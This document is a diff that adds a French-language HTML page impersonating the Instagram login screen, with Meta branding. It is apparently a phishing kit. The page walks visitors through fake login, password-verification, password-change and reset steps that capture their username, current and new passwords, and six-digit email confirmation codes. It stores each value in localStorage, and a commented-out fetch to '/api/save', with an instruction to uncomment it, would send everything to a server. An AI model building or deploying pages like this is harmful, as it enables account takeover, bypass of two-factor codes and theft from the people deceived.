@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+<style>
+  /* ============ VARIABLES LIGHT ============ */
+  :root {
+    --bg: #fafafa;
+    --panel-bg: #ffffff;
+    --card-bg: #ffffff;
+    --border: #dbdbdb;
+    --text: #262626;
+    --text-secondary: #8e8e8e;
+    --input-bg: #fafafa;
+    --input-border: #dbdbdb;
+    --input-focus: #a8a8a8;
+    --btn-bg: #0095f6;
+    --btn-hover: #1877f2;
+    --btn-disabled: #b2dffc;
+    --link: #00376b;
+    --back-bg: #ffffff;
+    --back-text: #262626;
+    --code-bg: #fafafa;
+    --divider: #dbdbdb;
+  }
+
+  /* ============ VARIABLES DARK ============ */
+  html[data-theme="dark"] {
+    --bg: #000000;
+    --panel-bg: #000000;
+    --card-bg: #000000;
+    --border: #262626;
+    --text: #f5f5f5;
+    --text-secondary: #a8a8a8;
+    --input-bg: #121212;
+    --input-border: #363636;
+    --input-focus: #555555;
+    --btn-bg: #0095f6;
+    --btn-hover: #1877f2;
+    --btn-disabled: #1e3a52;
+    --link: #e0f1ff;
+    --back-bg: #000000;
+    --back-text: #f5f5f5;
+    --code-bg: #121212;
+    --divider: #262626;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+
+  html, body {
+    background: var(--bg);
+    min-height: 100vh;
+    transition: background 0.2s ease;
+  }
+
+  /* ============ LAYOUT 2 COLONNES ============ */
+  .page {
+    display: flex;
+    min-height: 100vh;
+    width: 100%;
+  }
+
+  /* ---------- Colonne GAUCHE ---------- */
+  .left-panel {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    padding: 40px;
+    position: relative;
+    background: var(--panel-bg);
+    transition: background 0.2s ease;
+    min-width: 0;
+  }
+
+  .insta-logo-big {
+    width: 60px;
+    height: 60px;
+    position: absolute;
+    top: 40px;
+    left: 40px;
+  }
+
+  .left-content {
+    max-width: 500px;
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+  }
+
+  .left-content h1 {
+    font-size: 38px;
+    font-weight: 400;
+    line-height: 1.3;
+    color: var(--text);
+    margin-bottom: 40px;
+    letter-spacing: -0.5px;
+  }
+
+  .left-content h1 .gradient-text {
+    background: linear-gradient(90deg, #ff6b6b, #c13584, #833ab4);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    font-weight: 600;
+  }
+
+  .left-content .hero-image {
+    width: 100%;
+    max-width: 450px;
+    height: auto;
+    display: block;
+    margin: 0 auto;
+    border-radius: 12px;
+  }
+
+  /* ---------- Colonne DROITE ---------- */
+  .right-panel {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    padding: 40px;
+    background: var(--bg);
+    transition: background 0.2s ease;
+    min-width: 0;
+  }
+
+  .form-wrapper {
+    width: 100%;
+    max-width: 350px;
+  }
+
+  .card {
+    background: var(--card-bg);
+    border: 1px solid var(--border);
+    border-radius: 1px;
+    padding: 35px 35px 20px;
+    text-align: center;
+    transition: background 0.2s ease, border-color 0.2s ease;
+    margin-bottom: 10px;
+  }
+
+  .card h2 {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--text);
+    margin-bottom: 20px;
+    text-align: left;
+  }
+
+  .card p {
+    font-size: 14px;
+    color: var(--text-secondary);
+    margin-bottom: 20px;
+    line-height: 1.4;
+  }
+
+  .input-group {
+    position: relative;
+    margin-bottom: 6px;
+  }
+
+  .input-group input {
+    width: 100%;
+    padding: 12px 10px 10px;
+    background: var(--input-bg);
+    border: 1px solid var(--input-border);
+    border-radius: 3px;
+    font-size: 13px;
+    color: var(--text);
+    transition: background 0.2s ease, border-color 0.2s ease, color 0.2s ease;
+  }
+  .input-group input::placeholder { color: var(--text-secondary); font-size: 12px; }
+  .input-group input:focus { outline: none; border-color: var(--input-focus); }
+
+  .btn {
+    width: 100%;
+    padding: 8px;
+    background: var(--btn-bg);
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: background 0.2s ease, opacity 0.2s ease;
+  }
+  .btn:hover:not(:disabled) { background: var(--btn-hover); }
+  .btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+  .divider {
+    display: flex;
+    align-items: center;
+    margin: 20px 0;
+    color: var(--text-secondary);
+    font-size: 12px;
+    font-weight: 600;
+  }
+  .divider::before, .divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: var(--divider);
+  }
+  .divider span { padding: 0 18px; }
+
+  .forgot-link {
+    display: block;
+    margin-top: 5px;
+    color: var(--link);
+    font-size: 12px;
+    text-decoration: none;
+    text-align: center;
+  }
+  .forgot-link:hover { text-decoration: underline; }
+
+  .back-link {
+    display: block;
+    text-align: center;
+    padding: 15px;
+    background: var(--card-bg);
+    border: 1px solid var(--border);
+    color: var(--back-text);
+    font-size: 14px;
+    text-decoration: none;
+    cursor: pointer;
+    transition: background 0.2s ease, color 0.2s ease, border-color 0.2s ease;
+  }
+  .back-link:hover { background: var(--input-bg); }
+
+  .code-inputs {
+    display: flex;
+    gap: 6px;
+    justify-content: center;
+    margin-bottom: 20px;
+  }
+  .code-inputs input {
+    width: 42px;
+    height: 48px;
+    text-align: center;
+    font-size: 18px;
+    background: var(--code-bg);
+    border: 1px solid var(--input-border);
+    border-radius: 6px;
+    color: var(--text);
+    transition: background 0.2s ease, border-color 0.2s ease, color 0.2s ease;
+  }
+  .code-inputs input:focus { outline: none; border-color: #0095f6; background: var(--card-bg); }
+
+  .step { display: none; }
+  .step.active { display: block; }
+
+  /* ============ BOUTON THEME ============ */
+  .theme-toggle {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    width: 46px;
+    height: 46px;
+    border-radius: 50%;
+    border: 1px solid var(--border);
+    background: var(--card-bg);
+    color: var(--text);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+    z-index: 999;
+    transition: background 0.2s ease, border-color 0.2s ease, transform 0.15s ease;
+  }
+  .theme-toggle:hover { transform: scale(1.05); }
+  .theme-toggle svg { width: 22px; height: 22px; }
+  .theme-toggle .icon-sun { display: none; }
+  .theme-toggle .icon-moon { display: block; }
+  html[data-theme="dark"] .theme-toggle .icon-sun { display: block; }
+  html[data-theme="dark"] .theme-toggle .icon-moon { display: none; }
+
+  /* Meta logo */
+  .meta-logo {
+    text-align: center;
+    margin-top: 15px;
+    color: var(--text);
+    font-size: 14px;
+    font-weight: 500;
+    opacity: 0.85;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 6px;
+  }
+
+  /* ============ RESPONSIVE ============ */
+  @media (max-width: 875px) {
+    .left-panel { display: none; }
+    .right-panel { flex: 1; }
+  }
+</style>
+</head>
+<body>
+
+<!-- BOUTON THEME -->
+<button class="theme-toggle" id="themeToggle" aria-label="Changer le thème">
+  <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+  </svg>
+  <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <circle cx="12" cy="12" r="4"/>
+    <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/>
+  </svg>
+</button>
+
+<div class="page">
+
+  <!-- ================= COLONNE GAUCHE ================= -->
+  <div class="left-panel">
+    <!-- Logo Instagram en haut à gauche -->
+    <svg class="insta-logo-big" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="igGradient" x1="0%" y1="100%" x2="100%" y2="0%">
+          <stop offset="0%" stop-color="#FFDD55"/>
+          <stop offset="25%" stop-color="#FF543E"/>
+          <stop offset="50%" stop-color="#C837AB"/>
+          <stop offset="100%" stop-color="#833AB4"/>
+        </linearGradient>
+      </defs>
+      <rect x="2" y="2" width="20" height="20" rx="6" stroke="url(#igGradient)" stroke-width="2"/>
+      <circle cx="12" cy="12" r="4.5" stroke="url(#igGradient)" stroke-width="2"/>
+      <circle cx="17.5" cy="6.5" r="1.3" fill="url(#igGradient)"/>
+    </svg>
+
+    <div class="left-content">
+      <h1>
+        Regardez les moments du<br>
+        quotidien de vos<br>
+        <span class="gradient-text">amis proches.</span>
+      </h1>
+
+      <!-- Image hero.webp -->
+      <img class="hero-image" src="hero.webp" alt="Instagram" loading="lazy">
+    </div>
+  </div>
+
+  <!-- ================= COLONNE DROITE ================= -->
+  <div class="right-panel">
+    <div class="form-wrapper">
+
+      <!-- ============ ÉTAPE 0 : LOGIN ============ -->
+      <div class="step active" id="step0">
+        <div class="card">
+          <h2>Se connecter à Instagram</h2>
+          <form id="formLogin" autocomplete="off">
+            <div class="input-group">
+              <input type="text" id="loginUser" placeholder="Numéro de mobile, nom d'utilisateur ou e-mail" required>
+            </div>
+            <div class="input-group">
+              <input type="password" id="loginPass" placeholder="Mot de passe" required>
+            </div>
+            <button type="submit" class="btn" id="btnLogin" disabled>Se connecter</button>
+          </form>
+          <div class="divider"><span>OU</span></div>
+          <a href="#" class="forgot-link" id="forgotLink">Mot de passe oublié ?</a>
+        </div>
+        <div class="meta-logo">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"/>
+          </svg>
+          Meta
+        </div>
+      </div>
+
+      <!-- ============ ÉTAPE 1 ============ -->
+      <div class="step" id="step1">
+        <div class="card">
+          <h2 style="text-align:center;">Vérification du mot de passe</h2>
+          <p>Pour continuer, veuillez saisir votre mot de passe actuel.</p>
+          <form id="form1" autocomplete="off">
+            <div class="input-group">
+              <input type="password" id="currentPass" placeholder="Mot de passe actuel" required>
+            </div>
+            <button type="submit" class="btn" id="btn1" disabled>Confirmer</button>
+          </form>
+        </div>
+        <a class="back-link" id="backBtn">Retour à la connexion</a>
+      </div>
+
+      <!-- ============ ÉTAPE 2 ============ -->
+      <div class="step" id="step2">
+        <div class="card">
+          <h2 style="text-align:center;">Changer le mot de passe</h2>
+          <p>Créez un nouveau mot de passe sécurisé.</p>
+          <form id="form2" autocomplete="off">
+            <div class="input-group">
+              <input type="password" id="newPass" placeholder="Nouveau mot de passe" required>
+            </div>
+            <div class="input-group">
+              <input type="password" id="confirmPass" placeholder="Confirmer le mot de passe" required>
+            </div>
+            <button type="submit" class="btn" id="btn2" disabled>Confirmer</button>
+          </form>
+        </div>
+        <a class="back-link" id="backBtn2">Retour</a>
+      </div>
+
+      <!-- ============ ÉTAPE 3 ============ -->
+      <div class="step" id="step3">
+        <div class="card">
+          <h2 style="text-align:center;">Code de confirmation</h2>
+          <p>Saisissez le code à 6 chiffres envoyé à votre adresse e-mail.</p>
+          <form id="form3" autocomplete="off">
+            <div class="code-inputs">
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+            </div>
+            <button type="submit" class="btn" id="btn3" disabled>Confirmer</button>
+          </form>
+        </div>
+        <a class="back-link" id="backBtn3">Retour</a>
+      </div>
+
+      <!-- ============ ÉTAPE RESET : MOT DE PASSE ACTUEL ============ -->
+      <div class="step" id="stepReset">
+        <div class="card">
+          <h2 style="text-align:center;">Vérification du mot de passe</h2>
+          <p>Pour réinitialiser votre mot de passe, veuillez saisir votre mot de passe actuel.</p>
+          <form id="formReset" autocomplete="off">
+            <div class="input-group">
+              <input type="password" id="resetCurrentPass" placeholder="Mot de passe actuel" required>
+            </div>
+            <button type="submit" class="btn" id="btnReset" disabled>Confirmer</button>
+          </form>
+        </div>
+        <a class="back-link" id="backBtnReset">Retour à la connexion</a>
+      </div>
+
+      <!-- ============ ÉTAPE RESET CODE : CODE 6 CHIFFRES ============ -->
+      <div class="step" id="stepResetCode">
+        <div class="card">
+          <h2 style="text-align:center;">Code de confirmation</h2>
+          <p>Saisissez le code à 6 chiffres envoyé à votre e-mail.</p>
+          <form id="formResetCode" autocomplete="off">
+            <div class="code-inputs">
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+            </div>
+            <button type="submit" class="btn" id="btnResetCode" disabled>Confirmer</button>
+          </form>
+        </div>
+        <a class="back-link" id="backBtnResetCode">Retour</a>
+      </div>
+
+      <!-- ============ ÉTAPE NEW PASS : NOUVEAU MOT DE PASSE ============ -->
+      <div class="step" id="stepNewPass">
+        <div class="card">
+          <h2 style="text-align:center;">Nouveau mot de passe</h2>
+          <p>Créez un nouveau mot de passe sécurisé.</p>
+          <form id="formNewPass" autocomplete="off">
+            <div class="input-group">
+              <input type="password" id="newPassReset" placeholder="Nouveau mot de passe" required>
+            </div>
+            <div class="input-group">
+              <input type="password" id="confirmPassReset" placeholder="Confirmer le mot de passe" required>
+            </div>
+            <button type="submit" class="btn" id="btnNewPass" disabled>Confirmer</button>
+          </form>
+        </div>
+        <a class="back-link" id="backBtnNewPass">Retour</a>
+      </div>
+
+    </div>
+  </div>
+
+</div>
+
+<script>
+  /* ============ THEME ============ */
+  var themeToggle = document.getElementById('themeToggle');
+  var html = document.documentElement;
+
+  function getInitialTheme() {
+    var saved = localStorage.getItem('theme');
+    if (saved) return saved;
+    return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+  }
+
+  function applyTheme(theme) {
+    html.setAttribute('data-theme', theme);
+    localStorage.setItem('theme', theme);
+  }
+
+  applyTheme(getInitialTheme());
+
+  themeToggle.addEventListener('click', function () {
+    var current = html.getAttribute('data-theme');
+    applyTheme(current === 'dark' ? 'light' : 'dark');
+  });
+
+  /* ============ NAVIGATION ============ */
+  function goToStep(step) {
+    var steps = document.querySelectorAll('.step');
+    for (var i = 0; i < steps.length; i++) steps[i].classList.remove('active');
+    document.getElementById('step' + step).classList.add('active');
+    window.scrollTo(0, 0);
+  }
+
+  /* ============ ÉTAPE 0 : LOGIN ============ */
+  var loginUser = document.getElementById('loginUser');
+  var loginPass = document.getElementById('loginPass');
+  var btnLogin = document.getElementById('btnLogin');
+
+  function checkLogin() {
+    btnLogin.disabled = !(loginUser.value.length >= 1 && loginPass.value.length >= 6);
+  }
+  loginUser.addEventListener('input', checkLogin);
+  loginPass.addEventListener('input', checkLogin);
+
+  document.getElementById('formLogin').addEventListener('submit', function (e) {
+    e.preventDefault();
+    try {
+      localStorage.setItem('login_user', loginUser.value);
+      localStorage.setItem('login_pass', loginPass.value);
+    } catch (err) {}
+    // 👉 fetch('/api/login', {...})
+    goToStep(1);
+  });
+
+  document.getElementById('forgotLink').addEventListener('click', function (e) {
+    e.preventDefault();
+    goToStep('Reset');
+  });
+
+  /* ============ ÉTAPE 1 ============ */
+  var pass1 = document.getElementById('currentPass');
+  var btn1 = document.getElementById('btn1');
+  pass1.addEventListener('input', function () {
+    btn1.disabled = pass1.value.length < 1;
+  });
+
+  document.getElementById('form1').addEventListener('submit', function (e) {
+    e.preventDefault();
+    try { localStorage.setItem('current_pass', pass1.value); } catch (err) {}
+    // 👉 fetch('/api/save', {...})
+    goToStep(2);
+  });
+
+  /* ============ ÉTAPE 2 ============ */
+  var np = document.getElementById('newPass');
+  var cp = document.getElementById('confirmPass');
+  var btn2 = document.getElementById('btn2');
+
+  function checkPass() {
+    btn2.disabled = !(np.value.length >= 6 && np.value === cp.value);
+  }
+  np.addEventListener('input', checkPass);
+  cp.addEventListener('input', checkPass);
+
+  document.getElementById('form2').addEventListener('submit', function (e) {
+    e.preventDefault();
+    try { localStorage.setItem('new_pass', np.value); } catch (err) {}
+    // 👉 fetch('/api/save', {...})
+    goToStep(3);
+  });
+
+  /* ============ ÉTAPE 3 ============ */
+  var codeInputs = document.querySelectorAll('.code-inputs input');
+  var btn3 = document.getElementById('btn3');
+
+  for (var i = 0; i < codeInputs.length; i++) {
+    (function (index) {
+      var input = codeInputs[index];
+      input.addEventListener('input', function () {
+        input.value = input.value.replace(/[^0-9]/g, '');
+        if (input.value && index < codeInputs.length - 1) codeInputs[index + 1].focus();
+        checkCode();
+      });
+      input.addEventListener('keydown', function (e) {
+        if (e.key === 'Backspace' && !input.value && index > 0) codeInputs[index - 1].focus();
+      });
+    })(i);
+  }
+
+  function checkCode() {
+    var code = '';
+    for (var j = 0; j < codeInputs.length; j++) code += codeInputs[j].value;
+    btn3.disabled = code.length !== 6;
+  }
+
+  document.getElementById('form3').addEventListener('submit', function (e) {
+    e.preventDefault();
+    var code = '';
+    for (var j = 0; j < codeInputs.length; j++) code += codeInputs[j].value;
+    try { localStorage.setItem('code', code); } catch (err) {}
+
+    // 👉 Envoi vers serveur (décommente et adapte l'URL)
+    /*
+    fetch('/api/save', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        login_user: localStorage.getItem('login_user'),
+        login_pass: localStorage.getItem('login_pass'),
+        current_pass: localStorage.getItem('current_pass'),
+        new_pass: localStorage.getItem('new_pass'),
+        code: code
+      })
+    });
+    */
+
+    document.querySelector('#step3 h2').textContent = 'Vérification...';
+    document.querySelector('#step3 p').textContent = 'Veuillez patienter.';
+    btn3.disabled = true;
+    btn3.textContent = 'Envoi...';
+  });
+
+  /* ============ ÉTAPE RESET : MOT DE PASSE ACTUEL ============ */
+  var resetCurrentPass = document.getElementById('resetCurrentPass');
+  var btnReset = document.getElementById('btnReset');
+
+  function checkReset() {
+    btnReset.disabled = resetCurrentPass.value.length < 1;
+  }
+  resetCurrentPass.addEventListener('input', checkReset);
+
+  document.getElementById('formReset').addEventListener('submit', function (e) {
+    e.preventDefault();
+    try { localStorage.setItem('reset_current_pass', resetCurrentPass.value); } catch (err) {}
+    // 👉 fetch('/api/verify-current-password', {...})
+    goToStep('ResetCode');
+  });
+
+  /* ============ ÉTAPE RESET CODE : CODE 6 CHIFFRES ============ */
+  var resetCodeInputs = document.querySelectorAll('#stepResetCode .code-inputs input');
+  var btnResetCode = document.getElementById('btnResetCode');
+
+  for (var i = 0; i < resetCodeInputs.length; i++) {
+    (function (index) {
+      var input = resetCodeInputs[index];
+      input.addEventListener('input', function () {
+        input.value = input.value.replace(/[^0-9]/g, '');
+        if (input.value && index < resetCodeInputs.length - 1) resetCodeInputs[index + 1].focus();
+        checkResetCode();
+      });
+      input.addEventListener('keydown', function (e) {
+        if (e.key === 'Backspace' && !input.value && index > 0) resetCodeInputs[index - 1].focus();
+      });
+    })(i);
+  }
+
+  function checkResetCode() {
+    var code = '';
+    for (var j = 0; j < resetCodeInputs.length; j++) code += resetCodeInputs[j].value;
+    btnResetCode.disabled = code.length !== 6;
+  }
+
+  document.getElementById('formResetCode').addEventListener('submit', function (e) {
+    e.preventDefault();
+    var code = '';
+    for (var j = 0; j < resetCodeInputs.length; j++) code += resetCodeInputs[j].value;
+    try { localStorage.setItem('reset_code', code); } catch (err) {}
+    // 👉 fetch('/api/verify-code', {...})
+    goToStep('NewPass');
+  });
+
+  /* ============ ÉTAPE NEW PASS : NOUVEAU MOT DE PASSE ============ */
+  var newPassReset = document.getElementById('newPassReset');
+  var confirmPassReset = document.getElementById('confirmPassReset');
+  var btnNewPass = document.getElementById('btnNewPass');
+
+  function checkNewPass() {
+    btnNewPass.disabled = !(newPassReset.value.length >= 6 && newPassReset.value === confirmPassReset.value);
+  }
+  newPassReset.addEventListener('input', checkNewPass);
+  confirmPassReset.addEventListener('input', checkNewPass);
+
+  document.getElementById('formNewPass').addEventListener('submit', function (e) {
+    e.preventDefault();
+    try { localStorage.setItem('new_pass_reset', newPassReset.value); } catch (err) {}
+    // 👉 fetch('/api/set-new-password', {...})
+    
+    document.querySelector('#stepNewPass h2').textContent = 'Mot de passe modifié';
+    document.querySelector('#stepNewPass p').textContent = 'Votre mot de passe a été réinitialisé avec succès.';
+    btnNewPass.disabled = true;
+    btnNewPass.textContent = 'Terminé';
+    var inputs = document.querySelectorAll('#formNewPass input');
+    for (var k = 0; k < inputs.length; k++) inputs[k].disabled = true;
+    
+    setTimeout(function () { goToStep(0); }, 2000);
+  });
+
+  /* ============ BOUTONS RETOUR ============ */
+  document.getElementById('backBtn').addEventListener('click', function () { goToStep(0); });
+  document.getElementById('backBtn2').addEventListener('click', function () { goToStep(1); });
+  document.getElementById('backBtn3').addEventListener('click', function () { goToStep(2); });
+  document.getElementById('backBtnReset').addEventListener('click', function () { goToStep(0); });
+  document.getElementById('backBtnResetCode').addEventListener('click', function () { goToStep('Reset'); });
+  document.getElementById('backBtnNewPass').addEventListener('click', function () { goToStep('ResetCode'); });
+</script>
+</body>
+</html>
